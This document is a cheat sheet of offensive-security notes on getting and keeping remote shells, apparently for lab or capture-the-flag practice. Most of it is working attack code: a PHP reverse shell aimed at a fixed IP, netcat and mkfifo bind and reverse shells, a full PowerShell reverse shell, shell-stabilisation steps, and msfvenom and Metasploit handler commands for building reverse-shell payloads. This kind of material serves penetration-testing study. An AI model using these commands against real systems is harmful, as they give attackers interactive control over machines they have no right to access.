```php -r '$sock=fsockopen("10.13.3.137",50050);exec("/bin/sh -i <&3 >&3 2>&3");'```


```nc -lvnp 192.168.1.1 8181``` : Create listener 

```nc <LOCAL-IP> <PORT> -e /bin/bash``` : Execute bash on connection 

```nc 192.168.1.2 8181``` : Bind to listener @ 192.168.1.2:8181

```nc -lvnp <PORT> -e /bin/bash``` : Execute bash on connection to listener. Can be used as bind shell

note: -e is not included in most versions of netcat due to its insecurity. On windows can use a static binary, while on linux we can use.

```mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f``` : bind shell

```mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f``` : reverse shell
  
```powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"``` : powershell reverse shell

Stabilizing netcat reverse shell on linux.
technique 1.

1. ```python -c 'import pty;pty.spawn("/bin/bash")'``` : replace python with python2 or python3 where necessary
2. ```export TERM=xterm``` : this will give us access to term commands such as clear
3. background the shell using Ctrl + Z. and then do ```stty raw -echo; fg``` : turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

technique 2.
with rlwrap listener(not installed by default)
1. background the shell using Ctrl + Z. and then do ```stty raw -echo; fg``` : turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

technique 3.
transfer socat static compiled binary to target machine. (wget on linux or invoke-webrequest on windows)

change your terminal tty size
open another terminal and run ```stty -a```. Note down the values for "rows" and columns:

based on output values type in:

stty rows <number> 
  
stty cols <number>
  
 msfvenom --list payloads 
  
to generate the payloads which can be used to get bind or reverse shells we can use msfvenom.

```msfvenom -p <PAYLOAD> <OPTIONS>```
  
```msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>```

-f: Specifies output format, -o : output location and filename

When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:

<OS>/<arch>/<payload> : linux/x86/shell_reverse_tcp

Staged vs Stageless

You can send pyaloads in parts(stages) or all at once. As may be obvious this can have affects on detection based on size.

Staged: Payload sent in two parts. Small stager is sent and run onserver. This is small programmer which can connect back to listener but not actually create shell. Stager can then download the bigger payload to create shell. Requires special listener like metasploits multi/handler.

Stageless: send everything at once.

The payload shell_reverse_tcp indicates that it is a stageless payload. Stageless payloads are denoted with underscores (_). The staged equivalent to this payload would be:
shell/reverse_tcp

As staged payloads are denoted with another forward slash (/).

This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:

windows/x64/meterpreter/reverse_tcp

A Linux 32bit stageless Meterpreter payload would look like this:

linux/x86/meterpreter_reverse_tcp

when dealing with staged payloads metasploits multi/handler is good way to catch shells.

set PAYLOAD specific to target, aswell as lhost and lport 

exploit -j : runs listerner as job in background

